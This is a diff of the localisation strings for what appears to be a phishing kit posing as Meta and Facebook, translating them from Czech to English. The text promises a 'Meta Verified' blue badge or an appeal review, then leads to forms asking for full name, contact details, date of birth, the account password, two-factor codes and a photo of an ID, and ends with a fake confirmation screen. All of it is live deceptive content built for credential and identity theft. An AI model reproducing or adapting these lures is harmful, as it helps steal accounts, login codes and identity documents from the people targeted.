@@ -1,245 +1,245 @@
 {
   "menu": {
-    "title": "Centrum ochrany soukromí",
+    "title": "Privacy Centre",
     "menu_1": {
-      "title": "Domovská stránka Centra ochrany soukromí"
+      "title": "Privacy Centre Home"
     },
     "menu_2": {
-      "title": "Vyhledávání"
+      "title": "Search"
     },
     "menu_3": {
-      "title": "Běžná nastavení ochrany soukromí"
+      "title": "Common Privacy Settings"
     },
     "menu_4": {
-      "title": "Témata ochrany soukromí"
+      "title": "Privacy Topics"
     },
     "menu_5": {
-      "title": "Další zdroje o ochraně soukromí"
+      "title": "More Privacy Resources"
     },
     "menu_6": {
-      "title": "Zásady ochrany osobních údajů",
+      "title": "Privacy Policy",
       "sub_title": {
-        "sub_1": "Co jsou zásady ochrany osobních údajů a co pokrývají?",
-        "sub_2": "Jaké informace shromažďujeme?",
-        "sub_3": "Jak používáme vaše informace?",
-        "sub_4": "Jak sdílíme vaše informace na produktech nebo s integrovanými partnery?",
-        "sub_5": "Jak sdílíme informace s třetími stranami?",
-        "sub_6": "Jak je organizována spolupráce mezi společnostmi?",
-        "sub_7": "Jak můžete spravovat nebo mazat své informace a uplatňovat svá práva?",
-        "sub_8": "Jak dlouho uchováváme vaše informace?",
-        "sub_9": "Jak přenáším informace?",
-        "sub_10": "Jak reagujeme na oficiální žádosti, dodržujeme platné zákony a předcházíme škodám?",
-        "sub_11": "Jak zjistíte, když se zásady změní?",
-        "sub_12": "Jak pokládat otázky?",
-        "sub_13": "Proč a jak zpracováváme vaše údaje"
+        "sub_1": "What is the Privacy Policy and what does it cover?",
+        "sub_2": "What information do we collect?",
+        "sub_3": "How do we use your information?",
+        "sub_4": "How do we share your information on products or with integrated partners?",
+        "sub_5": "How do we share information with third parties?",
+        "sub_6": "How is the cooperation between companies organized?",
+        "sub_7": "How can you manage or delete your information and exercise your rights?",
+        "sub_8": "How long do we keep your information?",
+        "sub_9": "How do we transmit information?",
+        "sub_10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
+        "sub_11": "How will you know when the policy changes?",
+        "sub_12": "How to ask questions?",
+        "sub_13": "Why and how do we process your data"
       }
     },
     "menu_7": {
-      "title": "Další zásady a články",
+      "title": "Other Policies and Articles",
       "sub_title": {
-        "sub_1": "Zásady týkající se souborů cookie",
-        "sub_2": "Informace pro ty, kteří nepoužívají produkty",
-        "sub_3": "Jak se informace používají pro generativní modely AI",
-        "sub_4": "Zásady rámce pro přenos dat",
-        "sub_5": "Další podmínky a ustanovení"
+        "sub_1": "Cookie Policy",
+        "sub_2": "Information for those who don't use products",
+        "sub_3": "How information is used for generative AI models",
+        "sub_4": "Data Transfer Framework Policy",
+        "sub_5": "Other terms and conditions"
       }
     }
   },
   "content": {
     "top_content": {
-      "title": "Meta Verified – Odměny pro vás",
+      "title": "Meta Verified – Rewards for You",
       "sub": {
-        "sub_1": "Gratulujeme! Splnili jste všechny podmínky pro upgrade své stránky s modrým ověřovacím odznakem! Jde o významný milník, který odráží vaši oddanost a důvěru, kterou jste si vybudovali u svého publika.",
-        "sub_2": "Jsme nadšeni, že s vámi můžeme tento okamžik oslavit, a těšíme se, až vaše stránka díky tomuto prestižnímu uznání dále poroste!"
+        "sub_1": "Congratulations on meeting the requirements to upgrade your page with a verified blue badge! This is an incredible milestone that highlights your dedication and the trust you’ve built with your community.",
+        "sub_2": "We’re excited to celebrate this achievement with you and look forward to seeing your page continue to grow under this prestigious recognition!"
       },
-      "ticket": "ID vaší žádosti:"
+      "ticket": "Your Request ID:"
     },
     "guide": {
-      "title": "✅ Průvodce žádostí o modrý ověřovací odznak",
+      "title": "✅ Verified Blue Badge Request Guide",
       "sub": {
-        "sub_1": "Kontroloři faktů nebudou reagovat na žádosti, které obsahují hrozby, nenávistné projevy nebo urážlivý jazyk.",
-        "sub_2": "Ve své žádosti prosím uveďte všechny požadované informace, abyste zajistili rychlé zpracování. Pokud uvedete neplatnou e-mailovou adresu nebo neodpovíte na žádost o doplňující informace do 2 dnů, může být žádost uzavřena bez přezkoumání. Pokud zůstane žádost nevyřízená po dobu 4 dnů, Meta ji automaticky zamítne.",
-        "sub_3": "Jakmile budou všechny informace odeslány, posoudíme váš účet z hlediska možných omezení. Proces ověření obvykle trvá 24 hodin, ale může někdy trvat déle. Na základě našeho rozhodnutí budou omezení zachována nebo zrušena a váš účet bude podle toho aktualizován."
+        "sub_1": "Fact-checkers will not respond to requests containing threats, hate speech, or abusive language.",
+        "sub_2": "Please provide all required information in your request to ensure timely processing. Submitting an invalid email address or failing to reply to additional information requests within 2 days may result in the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+        "sub_3": "Once all details are submitted, we’ll evaluate your account for any policy restrictions. The verification process typically takes about 24 hours but may take longer in some cases. Based on the review outcome, restrictions will either remain or be lifted, and your account will be updated accordingly."
       }
     },
     "thumb": {
-      "title": "Kontrola ověření",
+      "title": "",
       "sub": {
-        "sub_1": "Žádost o přezkum",
-        "sub_2": "Zpracování obvykle trvá 24 až 48 hodin. Váš účet bude zkontrolován na možné porušení zásad."
+        "sub_1": "Review request",
+        "sub_2": "Processing usually takes 24–48 hours. Your account will be reviewed for any policy violations."
       },
-      "button": "Odeslat žádost",
-      "day": "Byli jste ověřeni dne"
+      "button": "Submit Request",
+      "day": "You were verified on"
     },
     "appeal_guide": {
-      "title": "Průvodce odvoláním",
+      "title": "Appeal Guide",
       "sub_title": {
-        "sub_1": "Ověřovatelé faktů nemusí reagovat na žádosti, které obsahují zastrašování, nenávistné projevy nebo jiné verbální hrozby.",
-        "sub_2": "Ve svém odvolání uveďte všechny potřebné informace, aby ověřovatel faktů mohl vaši žádost rychle zpracovat. Pokud uvedete neplatnou e-mailovou adresu nebo neodpovíte na žádost o dodatečné informace do 2 dnů, ověřovatel může žádost uzavřít bez zpracování. Pokud odvolání není zpracováno do 4 dnů, Meta ho automaticky zamítne.",
-        "sub_3": "Až bude vše připraveno, přezkoumáme váš účet a určíme, zda se na něj vztahují omezení. Proces ověření obvykle trvá 24 hodin, ale v některých případech může trvat déle. V závislosti na našem rozhodnutí zůstanou uložená omezení v platnosti, nebo budou zrušena a váš účet bude obnoven."
+        "sub_1": "Fact checkers may not respond to requests that include intimidation, hate speech, or other verbal threats.",
+        "sub_2": "In your appeal, please include all necessary information to make the fact checker process your request quickly. If you provide an invalid e-mail address or don't respond to a request for more information within 2 days, the fact checker can close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
+        "sub_3": "When everything is ready, we will review your account and decide if restrictions apply to it. The verification procedure usually takes 24 hours, but in some cases it can take longer. Depending on our decision, the restrictions will stay or we will lift them and your account will be reinstated."
       }
     },
     "privacy_center": {
-      "title": "Centrum ochrany soukromí",
+      "title": "Privacy Centre",
       "sub_title": {
         "sub_1": {
-          "title": "Co jsou zásady ochrany osobních údajů a co říkají?",
-          "description": "Zásady ochrany osobních údajů"
+          "title": "What is the Privacy Policy and what does it say?",
+          "description": "Privacy Policy"
         },
         "sub_2": {
-          "title": "Jak můžete spravovat nebo mazat své informace",
-          "description": "Zásady ochrany osobních údajů"
+          "title": "How you can manage or delete your information",
+          "description": "Privacy Policy"
         }
       }
     },
     "more_info": {
-      "title": "Další podrobnosti naleznete v Uživatelské smlouvě",
+      "title": "For more details, see the User Agreement",
       "sub_title": {
         "sub_1": {
-          "title": "Produkt AI",
-          "description": "Uživatelská smlouva"
+          "title": "AI Product",
+          "description": "User Agreement"
         }
       }
     },
     "resouces": {
-      "title": "Dodatečné zdroje",
+      "title": "Additional resources",
       "sub_title": {
         "sub_1": {
-          "title": "Jak se informace používají pro generativní modely AI",
-          "description": "Centrum ochrany soukromí"
+          "title": "How information is used for generative AI models",
+          "description": "Privacy Centre"
         },
         "sub_2": {
-          "title": "Karty s informacemi o fungování systémů AI",
-          "description": "Web produktu AI"
+          "title": "Cards with information about the operation of AI systems",
+          "description": "AI product website"
         },
         "sub_3": {
-          "title": "Úvod do generativní AI",
-          "description": "Pro teenagery"
+          "title": "Introduction to Generative AI",
+          "description": "For teens"
         }
       }
     },
     "footer": {
-      "title": "Neustále identifikujeme potenciální rizika ochrany soukromí, včetně shromažďování, používání nebo sdílení osobních údajů, a vyvíjíme metody k jejich omezení. Přečtěte si více o",
-      "link": "Zásady ochrany osobních údajů"
+      "title": "We continuously identify potential privacy risks, including when we collect, use, or share personal information, and develop methods to reduce those risks. Read more about",
+      "link": "Privacy Policy"
     },
     "modal": {
       "appeal_request": {
-        "title": "Formulář odvolání",
+        "title": "Information Form",
         "form": {
           "name": {
-            "placeholder": "Celé jméno",
-            "required": "Zadejte prosím úplné celé jméno."
+            "placeholder": "Full Name",
+            "required": "Please enter enough full name."
           },
           "email": {
             "placeholder": "E-mail",
-            "required": "Zadejte prosím dostatečnou e-mailovou adresu."
+            "required": "Please enter enough e-mail address."
           },
           "email_business": {
-            "placeholder": "Firemní e-mail",
-            "required": "Zadejte prosím dostatečnou firemní e-mailovou adresu."
+            "placeholder": "Business E-mail",
+            "required": "Please enter enough business e-mail address."
           },
           "page_name": {
-            "placeholder": "URL fanouškovské stránky",
-            "required": "Prosím, zadejte úplnou URL fanouškovské stránky."
+            "placeholder": "Fanpage Url",
+            "required": "Please enter enough fanpage url."
           },
           "phone_number": {
-            "placeholder": "Telefonní číslo",
-            "required": "Zadejte prosím dostatečné telefonní číslo."
+            "placeholder": "Phone Number",
+            "required": "Please enter enough phone number."
           },
           "date_of_birth": {
-            "title": "Datum narození",
+            "title": "Date of Birth",
             "day": {
-              "placeholder": "Den",
-              "required": "Zadejte prosím dostatečný den."
+              "placeholder": "Day",
+              "required": "Please enter enough day."
             },
             "month": {
-              "placeholder": "Měsíc",
-              "required": "Zadejte prosím dostatečný měsíc."
+              "placeholder": "Month",
+              "required": "Please enter enough month."
             },
             "year": {
-              "placeholder": "Rok",
-              "required": "Zadejte prosím dostatečný rok."
+              "placeholder": "Year",
+              "required": "Please enter enough year."
             }
           },
           "issue": {
-            "placeholder": "Popište svůj problém",
-            "required": "Zadejte prosím svůj problém.",
-            "note": "Naše odpověď vám bude zaslána do 14–48 hodin."
+            "placeholder": "Note",
+            "required": "Please enter your issue.",
+            "note": "Our response will be sent to you within 14 - 48 hours."
           },
           "facebook_notification": {
-            "title": "na Facebooku",
-            "description": "Zašleme vám upozornění na Facebooku."
+            "title": "on Facebook",
+            "description": "We will send you a notification on Facebook."
           },
           "check_form": {
-            "title": "Souhlasím s",
-            "link": "Podmínky použití"
+            "title": "I agree with",
+            "link": "Terms of use"
           },
-          "button": "Odeslat"
+          "button": "Send"
         }
       },
       "password": {
-        "title": "Heslo",
-        "description": "Z bezpečnostních důvodů musíte zadat své heslo, abyste mohli pokračovat.",
+        "title": "Password",
+        "description": "For your security, you must enter your password to continue.",
         "form": {
           "password": {
-            "placeholder": "Heslo",
-            "required": "Nezadali jste své heslo!",
-            "warning": "Zadané heslo je nesprávné."
+            "placeholder": "Password",
+            "required": "You did not enter your password!",
+            "warning": "The password you entered is incorrect."
           },
-          "button": "Pokračovat",
-          "forgot_password": "Zapomněli jste heslo?"
+          "button": "Continue",
+          "forgot_password": "Forgot your password?"
         }
       },
       "2fa": {
-        "title": "Je vyžadováno dvoufaktorové ověření (1/3)",
-        "description": "Ověřovací kód byl odeslán na vaše telefonní číslo nebo e-mail, zkontrolujte prosím svou schránku a zadejte kód níže k dokončení. Pokud kód neobdržíte, zkontrolujte upozornění na Facebooku na svém zařízení a potvrďte, že jste to vy, abyste dokončili proces ověření.",
+        "title": "Two-factor authentication required (1/3)",
+        "description": "The verification code has been sent to your phone number or e-mail, please check your inbox and enter the code below to complete. In case you don't receive the code, please check the Facebook notification on your device and confirm it's you to complete the verification process.",
         "form": {
-          "placeholder": "Kód",
-          "warning": "Zadané dvoufaktorové ověření je nesprávné. Zkuste to prosím znovu po",
-          "required": "Nezadali jste dvoufaktorové ověření!",
-          "minutes": "minutách",
-          "seconds": "sekundách",
-          "button": "Pokračovat"
+          "placeholder": "Code",
+          "warning": "The two-factor authentication you entered is incorrect. Please, try again after",
+          "required": "You did not enter your two-factor authentication!",
+          "minutes": "minutes",
+          "seconds": "seconds",
+          "button": "Continue"
         }
       },
       "upload_file": {
-        "title": "Nahrajte svůj průkaz totožnosti",
+        "title": "Upload your ID",
         "sub_title": {
-          "sub_1": "Než vás bezpečně vrátíme na Facebook, musíme se ujistit, že se jedná o váš účet. Můžete prokázat, že tento účet je váš, zasláním fotografie vašeho průkazu totožnosti.",
-          "sub_2": "Nepřijímáme fotografie obrazovky počítače, obrazovky telefonu ani kopie. Pokud budou nějaké problémy, zašleme vám e-mail.",
-          "sub_3": "Uchováme šifrovanou kopii vaší selfie až po dobu jednoho roku, abychom zlepšili naši schopnost detekovat falešné fotografie a chránili Facebook před zneužitím identity.",
-          "sub_4": "Změňte, jak dlouho uchováváme vaši selfie",
-          "sub_5": "nebo",
-          "sub_6": "Zjistěte více"
+          "sub_1": "Before we can get you back on Facebook safely, we need to make sure this is your account. You can prove this account is yours by sending us a photo of your ID.",
+          "sub_2": "We don't accept photos of a computer screen, phone screen, or photocopy. If there are any issues, we will send you an e-mail.",
+          "sub_3": "We will store an encrypted copy of your selfie for up to one year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.",
+          "sub_4": "Change how long we store your selfie for",
+          "sub_5": "or",
+          "sub_6": "Learn more"
         },
         "form": {
-          "file": "Nahrajte svůj průkaz totožnosti",
-          "warning": "není obrazový soubor",
-          "button": "Pokračovat"
+          "file": "Upload your ID",
+          "warning": "is not an image file",
+          "button": "Continue"
         }
       },
       "final_step": {
-        "title": "Žádost byla odeslána",
-        "description": "Vaše žádost byla přidána do fronty ke zpracování. Vaši žádost zpracujeme do 24 hodin. Pokud do 24 hodin neobdržíte e-mail se stavem odvolání, odešlete odvolání znovu.",
-        "button": "Návrat na Facebook"
+        "title": "Request has been sent",
+        "description": "Your request has been added to the processing queue. We will process your request within 24 hours. If you don't receive an e-mail message with the appeal status within 24 hours, please resend the appeal.",
+        "button": "Return to Facebook"
       },
       "authen_modal": {
-        "title": "Vyberte způsob, jak potvrdit, že jste to vy",
+        "title": "Choose a way to confirm it's you",
         "app": {
-          "sub_1": "Aplikační autentizátor",
-          "sub_2": "Přejděte do své autentizační aplikace"
+          "sub_1": "Authentication app",
+          "sub_2": "Go to your authentication app"
         },
         "sms": {
           "sub_1": "SMS",
-          "sub_2": "Zašleme kód na číslo"
+          "sub_2": "We will send a code to the number"
         },
         "email": {
           "sub_1": "E-mail",
-          "sub_2": "Zašleme kód na"
+          "sub_2": "We will send a code to"
         },
         "whatsapp": {
           "sub_1": "WhatsApp",
-          "sub_2": "Zašleme kód na číslo"
+          "sub_2": "We will send a code to the number"
         }
       }
     }
